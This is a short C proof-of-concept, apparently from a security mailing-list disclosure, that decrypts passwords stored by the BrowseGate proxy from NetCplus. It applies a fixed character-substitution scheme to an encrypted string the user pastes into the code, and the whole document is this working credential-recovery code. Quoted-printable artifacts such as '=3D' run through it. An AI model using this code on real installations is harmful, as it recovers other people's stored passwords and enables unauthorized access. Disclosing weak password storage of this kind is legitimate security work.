/* This is proof of concept code for decrypting password from BrowseGate =
by NetCplus */
#include <stdio.h>


int main() {

unsigned char start[8] =3D { 0x27, 0x41, 0x72, 0x4a, 0x47, 0x75, 0x4b, =
0x3a };
unsigned char hash[8] =3D { '%', '}', 'S', 'p', '%', 'g', 'Z', '(' } ;
/* Enter the encrypted password into hash above */
unsigned char except[8] =3D { '~', ':', 'k', 'C', '@', 'n', 'D', '3' };
unsigned char ex_order[7] =3D { 't', 'm', 'O', 'L', 's', 'B', 'R' };
unsigned char pass[8];
unsigned char i;
unsigned char range;

if(hash[0] >=3D '!' && hash[0] <=3D '&')
	hash[0]=3D(hash[0] - 0x20) + 0x7e;
for(i=3D0;i<8;i++) {
  if(hash[i] >=3D except[i] && hash[i] <=3D (except[i] + 6) ) {
	  pass[i]=3Dex_order[ (hash[i] - except[i]) ]; }
  else {
	  if(hash[i] < start[i]) {
		  hash[i]+=3D0x5e;
		  }
  	  pass[i]=3Dhash[i] - start[i] + '!';

  	if(pass[i] >=3D 'B')
	  pass[i]+=3D1;
	if(pass[i] >=3D 'L')
	  pass[i]+=3D1;
	if(pass[i] >=3D 'O')
	  pass[i]+=3D1;
	if(pass[i] >=3D 'R')
	  pass[i]+=3D1;
	if(pass[i] >=3D 'm')
	  pass[i]+=3D1;
    if(pass[i] >=3D 's')
      pass[i]+=3D1;
	if(pass[i] >=3D 't')
	  pass[i]+=3D1;

  }
}

printf("The password is:\n\t");
for(i=3D0;i<8;i++) {
  printf("%c ", pass[i]);
}
printf("\n");
return 0;
}

